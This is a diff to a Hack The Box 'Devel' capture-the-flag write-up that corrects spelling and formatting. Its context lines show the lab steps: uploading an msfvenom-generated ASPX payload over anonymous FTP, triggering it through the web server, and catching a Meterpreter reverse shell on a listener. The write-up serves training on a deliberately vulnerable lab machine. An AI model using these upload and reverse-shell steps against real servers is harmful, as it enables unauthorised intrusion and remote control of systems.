@@ -65,7 +65,7 @@ local: test.txt remote: test.txt
 226 Transfer complete.
 967 bytes sent in 0.00 secs (1016.5081 kB/s)
 ```
-If I go back to the wepage and navigate to <b>test.txt</b> we see my file
+If I go back to the web page and navigate to <b>test.txt</b> we see my file
 
 <center><img src="/htb/devel/test.png"></center>
 <br>
@@ -79,7 +79,7 @@ No encoder or badchars specified, outputting raw payload
 Payload size: 341 bytes
 Final size of aspx file: 2798 bytes
 ```
-I put the shell onto the sytem using FTP
+I put the shell onto the system using FTP
 ```
 ftp> put shell.aspx
 local: shell.aspx remote: shell.aspx
@@ -111,7 +111,7 @@ Now in the web page, navigate to <b>http://10.10.10.5/shell.aspx</b>
 
 <center><img src="/htb/devel/shell.png"></center>
 <br>
-Now if we check the listener we should have a meterpreter shell. Checking the user we will see that we have a low privilege shell
+Now if we check the listener we should have a <b>meterpreter</b> shell. Checking the user we will see that we have a low privilege shell
 ```
 [*] Started reverse TCP handler on 10.10.14.21:4444
 [*] Sending stage (179779 bytes) to 10.10.10.5
